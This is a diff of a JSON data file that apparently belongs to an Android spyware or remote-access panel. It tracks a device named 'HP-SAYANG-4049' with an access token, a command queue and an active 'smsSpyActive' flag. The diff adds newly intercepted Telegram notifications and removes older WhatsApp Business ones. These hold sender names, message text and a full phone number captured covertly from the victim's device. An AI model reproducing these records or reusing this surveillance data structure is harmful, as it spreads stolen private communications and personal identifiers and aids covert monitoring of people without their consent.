@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775632441005,
+    "lastSeen": 1775632444084,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Alifzx rezz",
+        "content": "Tar",
+        "time": "08/04 14:14",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632444397
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Bank ?",
+        "time": "08/04 14:14",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632444352
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "13 new messages from 12 chats",
+        "time": "08/04 14:14",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632444178
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Send id tele lu",
+        "time": "08/04 14:14",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632443334
+      },
+      {
+        "appName": "Telegram",
+        "sender": "マ || !`𝙈𝙖𝙣𝙯𝙧𝙤𝙬𝙧 𝐓𝟓",
+        "content": "enggaa",
+        "time": "08/04 14:14",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632443305
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Alifzx rezz",
+        "content": "Tar",
+        "time": "08/04 14:14",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632443293
+      },
       {
         "appName": "Telegram",
         "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
@@ -4278,54 +4326,6 @@
         "time": "08/04 13:36",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775630195913
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 831-9494-3474",
-        "content": "‎2 pesan baru",
-        "time": "08/04 13:36",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775630180832
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 831-9494-3474",
-        "content": "Kan udh kaga di urus",
-        "time": "08/04 13:36",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775630180829
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 831-9494-3474",
-        "content": "Ga balik kah uang gw?",
-        "time": "08/04 13:36",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775630176502
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 831-9494-3474",
-        "content": "Ga balik kah uang gw?",
-        "time": "08/04 13:36",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775630176208
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Tapi harus sambung kan",
-        "time": "08/04 13:35",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775630105084
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Mantax ada otaxrat nya",
-        "time": "08/04 13:34",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775630096946
       }
     ],
     "galleryPhotos": [],
